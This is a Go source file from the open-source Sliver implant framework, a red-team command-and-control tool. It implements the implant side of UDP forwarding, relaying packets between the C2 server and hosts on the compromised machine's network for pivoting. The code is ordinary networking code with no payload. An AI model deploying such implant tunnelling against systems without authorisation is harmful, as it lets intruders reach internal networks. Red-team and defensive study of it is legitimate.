package comm

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"encoding/gob"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"time"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// func init() {
//         gob.Register(&udpPacket{})
// }

// udpDialer - Any UDP handler started on an implant, no matter bind or reverse,
// needs a UDP listener since UDP is connection-less. However, this udpListener
// can both read from and write to a signle io.ReadWriteCloser, for the length of
// time this handler is running, or timeouts if any are specified.
type udpDialer struct {
	hostPort string
	stream   *udpStream
	outbound *net.UDPConn
}

// newDialerUDP - Creates UDP handler that is connected to an addess:port on the
// implant's host network. If specified, we dial with given source host:ports as well.
func newDialerUDP(info *sliverpb.ConnectionInfo, stream *udpStream) (h *udpDialer, err error) {

	// If source host:port, make UDP address. Rules are as following:
	// If none, use nil laddr (OS will take care)
	// If port and no addr, use 0.0.0.0:port
	// If port and addr, use them both.
	// If addr invalid, return and don't dial with OS-chosen source.
	var laddr *net.UDPAddr
	if info.LPort != 0 {
		var ip net.IP
		if info.LHost == "" {
			ip = net.ParseIP("0.0.0.0")
		} else {
			ip = net.ParseIP(info.LHost)
			if ip == nil {
				return nil, fmt.Errorf("Could not parse source IP address: %s", info.LHost)
			}
		}
		laddr = &net.UDPAddr{IP: ip, Port: int(info.LPort)}
	}

	// We need a destination address anyway.
	ip := net.ParseIP(info.RHost)
	if ip == nil {
		return nil, errors.New("Invalid RHost IP address")
	}
	raddr := &net.UDPAddr{IP: ip, Port: int(info.RPort)}

	// Get a UDP connection to the destination or return.
	udpConn, err := net.DialUDP("udp", laddr, raddr)
	if err != nil {
		return nil, fmt.Errorf("failed to dial UDP address %s: %s", raddr.String(), err.Error())
	}

	// Handler with a working conn, and wired up to the Comms.
	h = &udpDialer{
		hostPort: fmt.Sprintf("%s:%d", info.LHost, info.LPort),
		outbound: udpConn,
		stream:   stream,
	}

	return
}

// DialUDP - The server is forwarding us some UDP packets, writes them on the
// address:port socket, and read the response until some timeout.
// NOTE: All packets coming from the stream have the same destination addess:port
// so we only have one equivalent UDP connections to write the packets to.
func DialUDP(info *sliverpb.ConnectionInfo, stream io.ReadWriteCloser) error {

	// Create the UDP stream to wire the ReadWriteCloser and the UDP handler
	udpStream := &udpStream{
		r: gob.NewDecoder(stream),
		w: gob.NewEncoder(stream),
		c: stream,
	}

	// Create the UDP handler: dials the destination UDP address.
	handler, err := newDialerUDP(info, udpStream)
	if err != nil {
		return err
	}

	// Start processing packets from the host and route them back to the server
	// (Names of function are indeed opposite to their udpListener counterparts)
	go handler.handleRead()

	// Only then we write the data coming from the server,
	// as we're ready to get the response.
	go handler.handleWrite()

	return nil
}

// handleRead - Read all UDP packets coming at the host address:port
// and route (encode) them back to the server.
func (h *udpDialer) handleRead() error {
	const maxMTU = 9012
	buff := make([]byte, maxMTU)
	for {
		//response must arrive within 15 seconds
		deadline := 15 * time.Second
		h.outbound.SetReadDeadline(time.Now().Add(deadline))

		//read response
		n, src, err := h.outbound.ReadFromUDP(buff) // n, err := h.outbound.Read(buff)
		if err != nil {
			if !os.IsTimeout(err) && err != io.EOF {
				// {{if .Config.Debug}}
				log.Printf("read error: %s", err)
				// {{end}}
			}
			break
		}
		b := buff[:n]

		//encode back over ssh connection
		err = h.stream.encode(src.String(), b)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("encode error: %s", err)
			// {{end}}
			return err
		}
	}
	return nil
}

// handleWrite - Reads all packets forwarded by the server and write them to the UDP conn.
func (h *udpDialer) handleWrite() error {
	for {
		// Decode a UDP packet
		packet := udpPacket{}
		if err := h.stream.decode(&packet); err != nil {
			return err
		}

		// Write it to the host UDP connection
		_, err := h.outbound.Write(packet.Payload)
		if err != nil {
			return err
		}
	}
}
